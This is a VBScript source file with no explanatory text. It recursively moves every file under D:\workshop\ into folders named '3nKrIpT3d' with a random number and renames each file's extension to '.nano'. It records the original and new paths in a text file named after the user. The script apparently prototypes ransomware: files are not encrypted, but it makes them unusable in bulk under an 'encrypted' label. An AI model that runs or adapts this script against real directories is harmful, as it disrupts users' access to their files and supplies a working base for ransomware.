Option Explicit
Dim fso , Path , graveyard,Number ,Max,Min 
Dim Name,fname , a,des,lock,fext
Dim oFile
Max=100
Min=1
Randomize
Number= Int((Max-Min)*Rnd+1)
Dim folder , subfolder , file, ind , List , i,n , record , ws,ext
n=Int((Max-Min)*Rnd+1)
ind = ""
Set ws = CreateObject("Wscript.shell")
Dim UName,DeskDir,chunks
DeskDir = ws.SpecialFolders("Desktop")
chunks = Split(DeskDir,"\")
UName=chunks(2)
Set fso = CreateObject("Scripting.FileSystemObject")
Set oFile= fso.OpenTextFile(UName&".txt",2,True)
oFile.Close
Path = "D:\workshop\"
ext="nano"
graveyard = Path
lock= Path&"3nKrIpT3d"&n&"\"
For Each file In fso.GetFolder(Path).Files
fso.Createfolder lock
Call firstName(file)
des=lock&Left(fname,(Len(fname)-Len(fext)))&ext
record = file&"$$"&des
Call Log(record)
file.Move des
'-----------------------------------------------------------------------------------------------------------------
Next
Call Burrial(fso.GetFolder(Path))
MsgBox "Done" , vbInformation

'-----------------------------------------------------------------------------------------------------------------
Function Burrial(folder)
For Each subfolder In fso.GetFolder(folder).SubFolders
if subfolder<>(Path&"3nKrIpT3d"&n) Then
For Each file In fso.GetFolder(subfolder).Files
Call Builder(graveyard)
Call firstName(file)
des=Name&Left(fname,(Len(fname)-Len(fext)))&ext
record = file&"$$"&des
Call Log(record)
file.Move des
Next
Call Burrial (fso.GetFolder(subfolder))
End If
Next
End Function
'-----------------------------------------------------------------------------------------------------------------
Function Builder(Path)
Name = Path&"3nKrIpT3d"
Name = Name&Number&"\"
fso.Createfolder Name
Number = Number + 1
End Function
'-----------------------------------------------------------------------------------------------------------------
Function Log(rec)
Set oFile= fso.OpenTextFile(UName&".txt",8,True)
oFile.WriteLine rec
oFile.Close
End Function
'-----------------------------------------------------------------------------------------------------------------
Function firstName(name)
Dim info
info = Split(name,"\")
fname=info(UBound(info))
info=Split(fname,".")
fext=info(UBound(info))
End Function